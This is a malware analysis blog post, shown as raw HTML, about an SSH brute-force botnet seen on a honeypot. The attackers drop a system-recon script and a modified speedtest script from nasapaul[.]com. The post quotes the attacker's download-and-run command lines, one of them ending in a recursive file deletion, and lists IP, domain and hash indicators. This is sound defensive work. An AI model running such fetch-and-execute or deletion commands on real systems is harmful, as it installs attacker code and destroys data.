<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>NasaPaul Botnet: A Need for Speed | malwaremily</title><meta name=keywords content="honeytrap,honeypot,botnet,SSH,analysis,honeypot logs,malware"><meta name=description content="An Analysis of a Reoccuring Honeypot Security Event"><meta name=author content="malwaremily"><link rel=canonical href=https://malwaremily.com/posts/022-nasapaul/><meta name=google-site-verification content="G-ZSJEE4YGQQ"><link href=/assets/css/stylesheet.min.2a79645f388444ef452f62dadbadeebdfebba13b08d1b841a7504a7be022e74d.css integrity="sha256-KnlkXziERO9FL2La263uvf67oTsI0bhBp1BKe+Ai500=" rel="preload stylesheet" as=style><link rel=icon href=https://malwaremily.com/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://malwaremily.com/favicon.ico><link rel=icon type=image/png sizes=32x32 href=https://malwaremily.com/favicon.ico><link rel=apple-touch-icon href=https://malwaremily.com/favicon.ico><link rel=mask-icon href=https://malwaremily.com/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.80.0"><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','G-ZSJEE4YGQQ','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><meta property="og:title" content="NasaPaul Botnet: A Need for Speed"><meta property="og:description" content="An Analysis of a Reoccuring Honeypot Security Event"><meta property="og:type" content="article"><meta property="og:url" content="https://malwaremily.com/posts/022-nasapaul/"><meta property="og:image" content="https://malwaremily.com/img/022-ninfo03.png"><meta property="article:published_time" content="2021-02-27T02:26:03+00:00"><meta property="article:modified_time" content="2021-02-27T02:26:03+00:00"><meta property="og:site_name" content="malwaremily"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://malwaremily.com/img/022-ninfo03.png"><meta name=twitter:title content="NasaPaul Botnet: A Need for Speed"><meta name=twitter:description content="An Analysis of a Reoccuring Honeypot Security Event"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"NasaPaul Botnet: A Need for Speed","name":"NasaPaul Botnet: A Need for Speed","description":"Updated: 2021-02-28 - Update detection section to explain why v.py might not be flagged by AV. Updated: 2021-03-03 - Divide article by LM Kill Chain phases instead of MITRE …","keywords":["honeytrap","honeypot","botnet","SSH","analysis","honeypot logs","malware"],"articleBody":"Updated: 2021-02-28 - Update detection section to explain why v.py might not be flagged by AV. Updated: 2021-03-03 - Divide article by LM Kill Chain phases instead of MITRE ATT\u0026CK framework. Case Summary I collect live malware samples from honeypots running on public cloud servers. This case examines a repeated security event following a successful bruteforce attack against SSH where malware payloads ninfo and v.py are dropped from nasapaul[.]com. The samples examined in this post were captured on February 23rd, 2021.\nTimeline The security event described in this post was first logged on at 12:22:55 UTC on 2021-02-14. The event has been captured 33 times, with the latest related security event recorded at 16:03:19 UTC on 2021-02-25. If you are interested in viewing the raw logs associated with these repeated events, they can be found in this gist.\nDelivery In order to see any interaction from attackers on the honeypot, they must first brute force SSH. Successfully brute forcing the username admin and password password will allow the attacker to enter commands into an emulated shell. All entered commands return an error reporting the tool is not found (e.g. ls not found). In all instances of this repeated security event the first payload ninfo is seen after the attacker brute forces SSH.\nExploitation \u0026 Installation In 31 of the 33 captured events calling home to nasapaul[.]com the attacker downloads a payload, gives it execution permissions, and then runs the payload.\nwget nasapaul[.]com/ninfo ; chmod +x * ; ./ninfo Defense Evasion A change in this behavior is observed in two security events on 2021-02-16 where the following commands are entered:\nlscpu ; wget nasapaul[.]com/ninfo ; chmod +x * ; ./ninfo ; rm -rf * Here, the attacker now runs lscpu and after pulling and running ninfo it deletes all local files with rm -rf *. The rm -rf * is used to recursively destroy files ninfo and v.py in the working directory. Subsequent attacks on 2021-02-16 and later returned to the previous command line behavior, with no file removal process.\nCollection The purpose of ninfo is to collect system information. As a reminder, the output of the script is viewed by the attacker via their SSH session. This information can then be scraped, cataloged and/or utilized. The following information is gathered by ninfo:\n CPU CPU core count CPU stepping (similar to CPU version) CPU bogomips (a crude speed measurement of CPU) GPU type Disk space Uptime OS type OS version OS architecture Root or Privileged Process Access  Code Review ninfo code review Lines 4 - 19 specify the color used during output. These values are called throughout the script and result in colored formatting of information sent to standard out.\nLines 23 - 37 set variables for requested information. The script uses tools cut, sed, grep, head, and awk in order to manipulate the output of utility commands like lsb_release, free, uname, uptime, lscpi, and df and system files including /proc/cpuinfo and /proc/uptime. Using this technique the attacker is able to neatly print system information to the console in lines 55 - 63.\nLines 65 - 71 check to see if the script is running as a privileged process via the EUID or as root via UID. nu ai (not here) is printed if not root. ai (here) is printed if the UID or EUID is 0, indicating the script is running as a privileged process and/or the credentials in use by the attacker is root.\nNext, ninfo announces speed testul incepe in 3 secunde (speed test starts in three seconds) then echos out a countdown to standard out. In line 83 it pulls down a second payload from the nasapaul domain named v.py. In line 84 the script attempts to run that payload with perl. The following screenshot shows the output of ninfo if run without network connectivity or simulation:\nAdditional Details Source IP Origin The following information was sourced from the Talos Intelligence IP Reputation Lookup. This does not confirm an origin of attack, but rather gives us insight into the last hop on the internet. It is noted all IP addresses are owned by corporations associated with cloud hosting services.\n   IP NETWORK OWNER LOCATION     52.152.130.178 Microsoft Corporation Washington, United States   64.225.101.223 Digital Ocean Frankfurt am Main, Germany   167.99.253.119 Digital Ocean Frankfurt am Main, Germany   167.172.24.118 Digital Ocean Clifton, United States   178.62.231.95 Digital Ocean Amsterdam, Netherlands   188.166.99.239 Digital Ocean Amsterdam, Netherlands   188.166.124.29 Digital Ocean Amsterdam, Netherlands         A whois search for these IP addresses identify an organizational link ORG-DOI2-RIPE between some of the attacking IPs:\n 167.172.24.118/24 178.62.231.95/24 188.166.99.239/24 188.166.124.29/24  Language Indicators An identifying characteristic of this script is that the language used is a mix of English and Romanian. Searchinging for drept de root, versiune, testul incepe in, and secunde via google translator returns a language match for Romanian.\nA google search using code from the second payload v.py returns two positive hits:\n A malware sample from a github repo of malware collected by honeypots uploaded in DEC 2017. A speedtest-cli github repository pointing to file speedtest.py from Matt Martz.  To test to see if any files from github user sivel are being used by the attacker I hashed all files from the speedtest-cli github repo and compared these hashes against the hash for v.py. None of the hashes are matches, this means that if the attacker used a file from this repository it has since been modified. The results are shown below:\n86aa0f938b6d6a3b2ba54481f1debae2 v.py 051b5371b2a098f10d8271bbfbcd8ee6 CONTRIBUTING.md 3b83ef96387f14655fc854ddc3c6bd57 LICENSE 89ba249b2bf282b2ea9c35e5fd3a197d MANIFEST.in 8192020c86e390adb168431fdbf260c1 README.rst 0566968464b829958e9bf431eb1db62f setup.cfg 2a22f34184b9275db470c39026428709 setup.py 6697b8da88cf890de4b057c0151aad2a speedtest-cli.1 322eb3ec52f028e6b1df6bd0a9f6cb52 speedtest.py 37547186527ed0466ae145073f9012d1 tox.ini test/scripts/ 51b873473209d18958a05c767723836b source.py v.py code review The file v.py is 803 lines long, substantially longer than ninfo. If you would like to examine this file for yourself it can be retrieved from this github repository. Now we can review the code in v.py in order to understand more about its behavior.\nOverview in Comments This attacker put a lot of comments into their code. We see the following statements printed to console:\n1. Retrieving NasaPaul.com configuration 2. Retrieving NasaPaul.com server list The attacker switches to Romanian (the English translation is shown):\n3. Host Server is Google Cloud (Paul hides the IPs) 4. Looking for a server 5. Found a server start testing And then they use English…\n6. testing download speed Then Romanian…\n7. Download speed is XYZ Mbit/s Then English, and then Romanian again.\n8. Testing upload speed 9. The flood upload is XYZ Mbit/s After which point the script ends and the botnet logs out. Note that XYZ in this instance is a substitute for an upload/download speed value.\nMain Function I begin by looking at the main function def main() found on lines 793 - 797. The only defined functions called here are speedtest() and print_().\ndef main(): try: speedtest() except KeyboardInterrupt: print_('\\nCancelling...') The speedtest function is defined in the file on lines 553 - 790. We can get a sense of what the script is doing by logically following the calls to subroutines. This means you follow each call to a defined function, like a choose your own adventure book instead of reading the file start to finish. Though, you could totally do that too if you want to get a sense of the functions that might be called or preview to see if anything stylistically looks out of place or different. This code review will highlight some of the code using the comments printed to the console. If you’d like to skip ahead to the next section click here.\nRetrieving configuration from nasapaul[.]com References to nasapaul[.]com are seen within speedtest() on lines 624 and 632.\nThe excerpt below has been pulled from lines 623 - 624. Line 623 prints Retrieving NasaPaul.com configuration...' to console. This step of the python script executes regardless of internet connectivity.\n if not args.simple: print_('\\033[1;31m Retrieving \\033[1;37m NasaPaul.com\\033[1;m \\033[1;31m configuration...') try: config = getConfig() except URLError: print_('Cannot retrieve speedtest configuration') sys.exit(1) In case you are wondering why args.simple returns true each execution, note that args is set by the the options parser seen in lines 568 to 604 where --simple becomes args.simple as args is set to an options tuple. options is created from parser.parse_args(). This logic is shared below:\n description = ( 'Command line interface for testing internet bandwidth using ' 'speedtest.net.\\n' '------------------------------------------------------------' '--------------\\n' 'https://github.com/sivel/speedtest-cli') parser = ArgParser(description=description) # Give optparse.OptionParser an `add_argument` method for # compatibility with argparse.ArgumentParser try: parser.add_argument = parser.add_option except AttributeError: pass parser.add_argument('--bytes', dest='units', action='store_const', const=('byte', 1), default=('bit', 8), help='Display values in bytes instead of bits. Does ' 'not affect the image generated by --share') parser.add_argument('--share', action='store_true', help='Generate and provide a URL to the speedtest.net ' 'share results image') parser.add_argument('--simple', action='store_true', help='Suppress verbose output, only show basic ' 'information') parser.add_argument('--list', action='store_true', help='Display a list of speedtest.net servers ' 'sorted by distance') parser.add_argument('--server', help='Specify a server ID to test against') parser.add_argument('--mini', help='URL of the Speedtest Mini server') parser.add_argument('--source', help='Source IP address to bind to') parser.add_argument('--timeout', default=10, type=int, help='HTTP timeout in seconds. Default 10') parser.add_argument('--secure', action='store_true', help='Use HTTPS instead of HTTP when communicating ' 'with speedtest.net operated servers') parser.add_argument('--version', action='store_true', help='Show the version number and exit') options = parser.parse_args() if isinstance(options, tuple): args = options[0] else: args = options del options Returning to the first block of code, after Retrieving NasaPaul.com configuration...' is printed to console, on line 626 we see a call to getConfig(). This function seen in lines 376 - 414 is shared below:\ndef getConfig(): \"\"\"Download the speedtest.net configuration and return only the data we are interested in \"\"\" request = build_request('://www.speedtest.net/speedtest-config.php') uh, e = catch_request(request) if e: print_('Could not retrieve speedtest.net configuration: %s' % e) sys.exit(1) configxml = [] while 1: configxml.append(uh.read(10240)) if len(configxml[-1]) == 0: break if int(uh.code) != 200: return None uh.close() try: try: root = ET.fromstring(''.encode().join(configxml)) config = { 'client': root.find('client').attrib, 'times': root.find('times').attrib, 'download': root.find('download').attrib, 'upload': root.find('upload').attrib} except AttributeError: # Python3 branch root = DOM.parseString(''.join(configxml)) config = { 'client': getAttributesByTagName(root, 'client'), 'times': getAttributesByTagName(root, 'times'), 'download': getAttributesByTagName(root, 'download'), 'upload': getAttributesByTagName(root, 'upload')} except SyntaxError: print_('Failed to parse speedtest.net configuration') sys.exit(1) del root del configxml return config In the function snippet below pulled from getConfig() above, a request is built using build_request for speedtest.net. build_request “build[s] a urllib2 request object to automatically add a user-agent header to all requests” for a url.\n request = build_request('://www.speedtest.net/speedtest-config.php') uh, e = catch_request(request) Following the creation of request, catch_request is described as “a helper function to catch common exceptions when establishing a connection with a HTTP/S request.” The result of the catch_request(request) and any resulting errors are stored in variables uh and e respectively. If an error is created and stored in variable e the script will gracefully exit:\nif e: print_('Could not retrieve speedtest.net configuration: %s' % e) sys.exit(1) On lines 386 - 393 of the getConfig() function a variable configxml of type tuple is created. The response from www.speedtest.net/speedtest-config.php in variable uh is appended to configxml. configxml[-1] points to the last value in the tuple configxml. If the length of this value is zero, then the while loop can break. If the value of the response from speednet.com is anything other than 200 OK then None is returned from getConfig().\nconfigxml = [] while 1: configxml.append(uh.read(10240)) if len(configxml[-1]) == 0: break if int(uh.code) != 200: return None uh.close() While the commented code reads, “retrieving configuration nasapaul[.]com” this behavior was not confirmed in the python script. Only communication to www.speedtest.net/speedtest-config.php was observed.\nRetrieving nasapaul Server List Lines 631 - 644 handle commands related to the Retrieving NasaPaul[.]com server list... comment printed to console:\nif not args.simple: print_('\\033[1;31m Retrieving \\033[1;37m NasaPaul.com\\033[1;m \\033[1;31m server list...') if args.list or args.server: servers = closestServers(config['client'], True) if args.list: serverList = [] for server in servers: line = ('%(id)4s) %(sponsor)s (%(name)s, %(country)s) ' '[%(d)0.2f km]' % server) serverList.append(line) print_('\\n'.join(serverList).encode('utf-8', 'ignore')) sys.exit(0) else: servers = closestServers(config['client']) We want to look at the closestServers functions to get a better idea of what servers are being used in this block of code. If you want to review these functions briefly check out this gist.\nLooking at the closestServers() definition, the urls in use are:\n urls = [ '://www.speedtest.net/speedtest-servers-static.php', '://c.speedtest.net/speedtest-servers-static.php', '://www.speedtest.net/speedtest-servers.php', '://c.speedtest.net/speedtest-servers.php', ] Similar to what we’ve seen previously in getConfig() we see calls out to the listered urls using build_request and catch_request:\nfor url in urls: try: request = build_request(url) uh, e = catch_request(request) if e: errors.append('%s' % e) raise SpeedtestCliServerListError serversxml = [] while 1: serversxml.append(uh.read(10240)) if len(serversxml[-1]) == 0: break if int(uh.code) != 200: uh.close() raise SpeedtestCliServerListError uh.close() While the commented code read, retrieving nasapaul[.]com server list this behavior was not confirmed in the python script. Instead calls to speedtest.net are seen.\nHost Server is Google Cloud (Paul hides the IPs) On lines 645 and 648 a print_ statement below prints out Server Hostat De (Hosted Server) and Paul ascunde IPu (Paul hides the IPu).\n if not args.simple: print_('\\033[1;31m Server Hostat De \\033[1;m \\033[1;37m%(isp)s\\033[1;m (\\033[1;37mPaul ascunde IPu\\033[1;m)\\033[1;37m...' % config['client']) However, this part of the script will print the ISP in use to console but no such evidence of “hiding IPs” was found in the python script.\nLooking for and Finding a Server Similar to the previous comment the comments, Cautam ce-l mai bun server(We are looking for the best server) and Server Gasit incepem Testele(Server found, tests are started) are printed to console prior to a call to getBestServers().\n if not args.simple: print_('\\033[1;31m Cautam ce-l mai bun server \\033[1;m') print_('\\033[1;31m Server Gasit incepem Testele \\033[1;m') best = getBestServer(servers) The function getBestServers() is defined on lines 498 - 534:\ndef getBestServer(servers): \"\"\"Perform a speedtest.net latency request to determine which speedtest.net server has the lowest latency \"\"\" results = {} for server in servers: cum = [] url = '%s/latency.txt' % os.path.dirname(server['url']) urlparts = urlparse(url) for i in range(0, 3): try: if urlparts[0] == 'https': h = HTTPSConnection(urlparts[1]) else: h = HTTPConnection(urlparts[1]) headers = {'User-Agent': user_agent} start = timeit.default_timer() h.request(\"GET\", urlparts[2], headers=headers) r = h.getresponse() total = (timeit.default_timer() - start) except (HTTPError, URLError, socket.error): cum.append(3600) continue text = r.read(9) if int(r.status) == 200 and text == 'test=test'.encode(): cum.append(total) else: cum.append(3600) h.close() avg = round((sum(cum) / 6) * 1000, 3) results[avg] = server fastest = sorted(results.keys())[0] best = results[fastest] best['latency'] = fastest return best In this function, the passed variable servers has been set in lines 634 or 644 via a call to closestServers() using output created from the configServer() function, discussed in the previous sections. I found no evidence to suggest that any servers related to nasapaul[.]com were queried.\nTesting Download and Upload Speeds Finally, the download and upload speeds are collected using functions downloadspeed() and uploadspeed().\n if not args.simple: print_(('\\033[1;31m Server Intretinut de \\033[1;37m%(sponsor)s\\033[1;m (\\033[1;37m%(name)s\\033[1;m) \\033[1;m[\\033[1;37m%(d)0.2f km\\033[1;m]\\033[1;37m:\\033[1;37m ' '%(latency)s ms\\033[1;31m' % best).encode('utf-8', 'ignore')) else: print_('Ping: %(latency)s ms' % best) sizes = [350, 500, 750, 1000, 1500, 2000, 2500, 3000, 3500, 4000] urls = [] for size in sizes: for i in range(0, 4): urls.append('%s/random%sx%s.jpg' % (os.path.dirname(best['url']), size, size)) if not args.simple: print_(' Testing download speed', end='') dlspeed = downloadSpeed(urls, args.simple) if not args.simple: print_() print_(' Download-ul este de : \\033[1;37m%0.2f M%s/s' % ((dlspeed / 1000 / 1000) * args.units[1], args.units[0])) sizesizes = [int(.25 * 1000 * 1000), int(.5 * 1000 * 1000)] sizes = [] for size in sizesizes: for i in range(0, 25): sizes.append(size) if not args.simple: print_('\\033[1;31m Testing upload speed', end='') ulspeed = uploadSpeed(best['url'], sizes, args.simple) if not args.simple: print_() print_(' Upload-ul de flood este : \\033[1;37m%0.2f M%s/s\\033[1;31m' % ((ulspeed / 1000 / 1000) * args.units[1], args.units[0])) if args.share and args.mini: print_('Cannot generate a speedtest.net share results image while ' 'testing against a Speedtest Mini server') elif args.share: dlspeedk = int(round((dlspeed / 1000) * 8, 0)) ping = int(round(best['latency'], 0)) ulspeedk = int(round((ulspeed / 1000) * 8, 0)) The uploadspeed() and downloadspeed() functions launch FileGetter and FilePutter threats to calculate upload/download speeds. Nothing in these functions appeared malicious nor did they redirect to a malicious url.\nIt is noted, however, that the results of the speed test are sent to speedtest[.]net. This code is shown below:\n # Build the request to send results back to speedtest.net # We use a list instead of a dict because the API expects parameters # in a certain order apiData = [ 'download=%s' % dlspeedk, 'ping=%s' % ping, 'upload=%s' % ulspeedk, 'promo=', 'startmode=%s' % 'pingselect', 'recommendedserverid=%s' % best['id'], 'accuracy=%s' % 1, 'serverid=%s' % best['id'], 'hash=%s' % md5(('%s-%s-%s-%s' % (ping, ulspeedk, dlspeedk, '297aae72')) .encode()).hexdigest()] headers = {'Referer': 'http://c.speedtest.net/flash/speedtest.swf'} request = build_request('://www.speedtest.net/api/api.php', data='\u0026'.join(apiData).encode(), headers=headers) f, e = catch_request(request) if e: print_('Could not submit results to speedtest.net: %s' % e) sys.exit(1) response = f.read() code = f.code f.close() In an effort to be clear, I will repeat that speedtest.net is the only domain used in the v.py script aside from the nasapaul[.]com references printed to console using print_(). All network related communication in the v.py script appears limited to speedtest.net.\nImpact Successful execution of ninfo results in losing information about system specification including hardware or virtualized hardware specifications described in the Collection section above. Successful execution of v.py results in information about the system’s bandwidth and level of privilege associated with the compromised login. This information is relayed to the attacker via the SSH session. Typically, these types of collections are stored and re-used either for manipulation by the original attacker or they could be sold on a criminal network for use in a DDoS for hire like a DDoSaaS offering.\nAll of these attacks originated from successful bruteforce attempts against SSH. There are a few strategies you can use to protect against SSH attacks. You could move the SSH port to a non-default port (e.g. from p22 to p43895). This will subvert some automated attacks, but it is a weak control because the new SSH port can be identified with a simple nmap scan. A more effective way to protect against SSH attacks would be to authenticate using an SSH key or using certificate-based authentication. To pair with this control, you should modify the global ssh configuration file (/etc/ssh/ssh_config) to disable password authentication. You could also use a service like fail2ban to put IPs with repeated failed authentication attempts to SSH on a denylist. For example, if an IP address fails to authenticate 10 times in a row fail2ban would jail the IP, effectively preventing it from being able to login using SSH for a period of time.\nUnanswered Questions \u0026 Opinions In my opinion these security events may be the result of a botnet looking for victim hosts to utilize as a part of a DDoS network and/or to be used to serve and collect information about other vulnerable hosts. I have reached this conclusion because the commands seen in the repeated security event are limited to collection information related to computer specifications and bandwidth. Another potential explaination could be that the botnet is searching for victims to mine cryptocurrency. Without further information, these conclusions are purely speculative.\nThere are a few questions leftover from this case I am still asking myself. Foremost in my mind is seeing a python script run with perl. I could see perl being remapped to a python binary but this behavior was not seen in ninfo. How does that work? Is the #!/usr/bin/env python on line 1 of the file enough for the interpreter to know to use python instead of perl? If I learn anything new related to this event I’ll update and mark the date at the top of this post and/or link to more information.\nDetections When scanned with clamAV no detections are yet seen:\nWhen I first uploaded ninfo to virustotal on 2021-02-23 it had 1/64 antivirus detections. Since then, the number has increased to 6/64.\nv.py remains at undetected as of 2021-02-27. This is not surprising since the script is a a bandwidth test that reaches out to a known good site, Speedtest by Ookla. Whether the script is malicious or not could be of debate, though, since this specific script v.py used in the context of data collection I would flag the hash.\nNetwork The following IP addresses were associated with one or more successful SSH brute force attacks.\n52.152.130.178 64.225.101.223 167.99.253.119 167.172.24.118 178.62.231.95 188.166.99.239 188.166.124.29 DNS The following hostnames were associated with one or more of the security events described in this post.\nnasapaul[.]com wpmudev[.]host File Hashes md5sum 678af2ec3251f8692c9324ffe64c198a ninfo 86aa0f938b6d6a3b2ba54481f1debae2 v.py sha256sum 19778a62055770a9e5f890e52227ccd39251bf23045c15383411638540ceabf7 ninfo 00e430b733cf199747c9c6e0f2e2fae6a045bbed9c0f0f993112b301fcdf5dbc v.py MITRE Tactics  T1595 Active Scanning: Scanning IP Blocks T1110 Brute Force  Password Guessing Password Spraying   T1190 Exploit Public-Facing Application T1078 Valid Accounts: Local Accounts T1119 Automated Collection T1059 Command and Scripting Interpreter  Unix Shell Python   T1070 Indicator Removal on Host: File Deletion  ","wordCount":"3407","inLanguage":"en","image":"https://malwaremily.com/img/022-ninfo03.png","datePublished":"2021-02-27T02:26:03Z","dateModified":"2021-02-27T02:26:03Z","author":{"@type":"Person","name":"malwaremily"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://malwaremily.com/posts/022-nasapaul/"},"publisher":{"@type":"Organization","name":"malwaremily","logo":{"@type":"ImageObject","url":"https://malwaremily.com/favicon.ico"}}}</script></head><body id=top><script>if(localStorage.getItem("pref-theme")==="dark"){document.body.classList.add('dark');}else if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}else if(window.matchMedia('(prefers-color-scheme: dark)').matches){document.body.classList.add('dark');}</script><noscript><style type=text/css>.theme-toggle,.top-link{display:none}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://malwaremily.com/ accesskey=h title="Home (Alt + H)"><img src=coffeaarabica400x400.png alt=logo aria-label=logo height=35>Home</a>
<span class=logo-switches><span class=theme-toggle title="(Alt + T)"><a id=theme-toggle accesskey=t><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></span></span></div><ul class=menu id=menu onscroll=menu_on_scroll()><li><a href=https://malwaremily.com/about/ title=ABOUT><span>ABOUT</span></a></li><li><a href=https://malwaremily.com/archives/ title=ARCHIVES><span>ARCHIVES</span></a></li><li><a href=https://malwaremily.com/search/ title="SEARCH (Alt + /)" accesskey=/><span>SEARCH</span></a></li><li><a href=https://malwaremily.com/tags/ title=TAGS><span>TAGS</span></a></li><li><a href=https://malwaremily.com title=HOME><span>HOME</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>NasaPaul Botnet: A Need for Speed</h1><div class=post-description>An Analysis of a Reoccuring Honeypot Security Event</div><div class=post-meta>February 27, 2021&nbsp;·&nbsp;16 min</div></header><figure class=entry-cover><img src=https://malwaremily.com/img/022-ninfo03.png alt="ninfo malware"><p></p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><div class=details>Table of Contents</div></summary><blockquote><ul><li><a href=#case-summary aria-label="Case Summary">Case Summary</a></li><li><a href=#timeline aria-label=Timeline>Timeline</a><ul><li><a href=#delivery aria-label=Delivery>Delivery</a></li><li><a href=#exploitation--installation aria-label="Exploitation &amp;amp; Installation">Exploitation & Installation</a><ul><li><a href=#defense-evasion aria-label="Defense Evasion">Defense Evasion</a></li><li><a href=#collection aria-label=Collection>Collection</a></li></ul></li></ul></li><li><a href=#code-review aria-label="Code Review">Code Review</a><ul><li><a href=#ninfo-code-review aria-label="ninfo code review"><code>ninfo</code> code review</a><ul><li><a href=#additional-details aria-label="Additional Details">Additional Details</a><ul><li><a href=#source-ip-origin aria-label="Source IP Origin">Source IP Origin</a></li><li><a href=#language-indicators aria-label="Language Indicators">Language Indicators</a></li></ul></li></ul></li><li><a href=#vpy-code-review aria-label="v.py code review"><code>v.py</code> code review</a><ul><li><a href=#overview-in-comments aria-label="Overview in Comments">Overview in Comments</a></li><li><a href=#main-function aria-label="Main Function">Main Function</a></li><li><a href=#retrieving-configuration-from-nasapaulcom aria-label="Retrieving configuration from nasapaul[.]com">Retrieving configuration from nasapaul[.]com</a></li><li><a href=#retrieving-nasapaul-server-list aria-label="Retrieving nasapaul Server List">Retrieving nasapaul Server List</a></li><li><a href=#host-server-is-google-cloud-paul-hides-the-ips aria-label="Host Server is Google Cloud (Paul hides the IPs)">Host Server is Google Cloud (Paul hides the IPs)</a></li><li><a href=#looking-for-and-finding-a-server aria-label="Looking for and Finding a Server">Looking for and Finding a Server</a></li><li><a href=#testing-download-and-upload-speeds aria-label="Testing Download and Upload Speeds">Testing Download and Upload Speeds</a></li></ul></li></ul></li><li><a href=#impact aria-label=Impact>Impact</a><ul><li><a href=#unanswered-questions--opinions aria-label="Unanswered Questions &amp;amp; Opinions">Unanswered Questions & Opinions</a></li></ul></li><li><a href=#detections aria-label=Detections>Detections</a><ul><li><a href=#network aria-label=Network>Network</a></li><li><a href=#dns aria-label=DNS>DNS</a></li><li><a href=#file-hashes aria-label="File Hashes">File Hashes</a><ul><ul><li><a href=#md5sum aria-label=md5sum>md5sum</a></li><li><a href=#sha256sum aria-label=sha256sum>sha256sum</a></li></ul></ul></li></ul></li><li><a href=#mitre-tactics aria-label="MITRE Tactics">MITRE Tactics</a></li></ul></blockquote></details></div><div class=post-content><p>Updated: 2021-02-28 - Update detection section to explain why <code>v.py</code> might not be flagged by AV.
Updated: 2021-03-03 - Divide article by LM Kill Chain phases instead of MITRE ATT&CK framework.</p><h1 id=case-summary>Case Summary<a hidden class=anchor aria-hidden=true href=#case-summary>#</a></h1><p>I collect live malware samples from honeypots running on public cloud servers. This case examines a repeated security event following a successful bruteforce attack against SSH where malware payloads <code>ninfo</code> and <code>v.py</code> are dropped from <code>nasapaul[.]com</code>. The samples examined in this post were captured on February 23rd, 2021.</p><h1 id=timeline>Timeline<a hidden class=anchor aria-hidden=true href=#timeline>#</a></h1><p>The security event described in this post was first logged on at 12:22:55 UTC on 2021-02-14. The event has been captured 33 times, with the latest related security event recorded at 16:03:19 UTC on 2021-02-25. If you are interested in viewing the raw logs associated with these repeated events, they can be found in this <a href=https://gist.github.com/malwaremily/aa37b170ab02429c42eb70592a783a33>gist</a>.</p><h2 id=delivery>Delivery<a hidden class=anchor aria-hidden=true href=#delivery>#</a></h2><p>In order to see any interaction from attackers on the honeypot, they must first brute force SSH. Successfully brute forcing the username <code>admin</code> and password <code>password</code> will allow the attacker to enter commands into an emulated shell. All entered commands return an error reporting the tool is not found (e.g. <code>ls not found</code>). In all instances of this repeated security event the first payload <code>ninfo</code> is seen after the attacker brute forces SSH.</p><h2 id=exploitation--installation>Exploitation & Installation<a hidden class=anchor aria-hidden=true href=#exploitation--installation>#</a></h2><p>In 31 of the 33 captured events calling home to <code>nasapaul[.]com</code> the attacker downloads a payload, gives it execution permissions, and then runs the payload.</p><pre><code>wget nasapaul[.]com/ninfo ; chmod +x * ; ./ninfo
</code></pre><h3 id=defense-evasion>Defense Evasion<a hidden class=anchor aria-hidden=true href=#defense-evasion>#</a></h3><p>A change in this behavior is observed in two security events on 2021-02-16 where the following commands are entered:</p><pre><code>lscpu ; wget nasapaul[.]com/ninfo ; chmod +x * ; ./ninfo ; rm -rf *
</code></pre><p>Here, the attacker now runs <code>lscpu</code> and after pulling and running <code>ninfo</code> it deletes all local files with <code>rm -rf *</code>. The <code>rm -rf *</code> is used to recursively destroy files <code>ninfo</code> and <code>v.py</code> in the working directory. Subsequent attacks on 2021-02-16 and later returned to the previous command line behavior, with no file removal process.</p><h3 id=collection>Collection<a hidden class=anchor aria-hidden=true href=#collection>#</a></h3><p>The purpose of <code>ninfo</code> is to collect system information. As a reminder, the output of the script is viewed by the attacker via their SSH session. This information can then be scraped, cataloged and/or utilized. The following information is gathered by <code>ninfo</code>:</p><ul><li>CPU</li><li>CPU core count</li><li>CPU stepping (similar to CPU version)</li><li>CPU bogomips (a crude speed measurement of CPU)</li><li>GPU type</li><li>Disk space</li><li>Uptime</li><li>OS type</li><li>OS version</li><li>OS architecture</li><li>Root or Privileged Process Access</li></ul><h1 id=code-review>Code Review<a hidden class=anchor aria-hidden=true href=#code-review>#</a></h1><h2 id=ninfo-code-review><code>ninfo</code> code review<a hidden class=anchor aria-hidden=true href=#ninfo-code-review>#</a></h2><p><img src=/img/022-ninfo01.png alt="ninfo script lines 00 - 41"></p><p>Lines <code>4</code> - <code>19</code> specify the color used during output. These values are called throughout the script and result in colored formatting of information sent to standard out.</p><p>Lines <code>23</code> - <code>37</code> set variables for requested information. The script uses tools <code>cut</code>, <code>sed</code>, <code>grep</code>, <code>head</code>, and <code>awk</code> in order to manipulate the output of utility commands like <code>lsb_release</code>, <code>free</code>, <code>uname</code>, <code>uptime</code>, <code>lscpi</code>, and <code>df</code> and system files including <code>/proc/cpuinfo</code> and <code>/proc/uptime</code>. Using this technique the attacker is able to neatly print system information to the console in lines <code>55</code> - <code>63</code>.</p><p><img src=/img/022-ninfo02.png alt="ninfo script lines 41 - 84"></p><p>Lines <code>65</code> - <code>71</code> check to see if the script is running as a privileged process via the EUID or as root via UID. <code>nu ai</code> (not here) is printed if not root. <code>ai</code> (here) is printed if the UID or EUID is <code>0</code>, indicating the script is running as a privileged process and/or the credentials in use by the attacker is root.</p><p>Next, 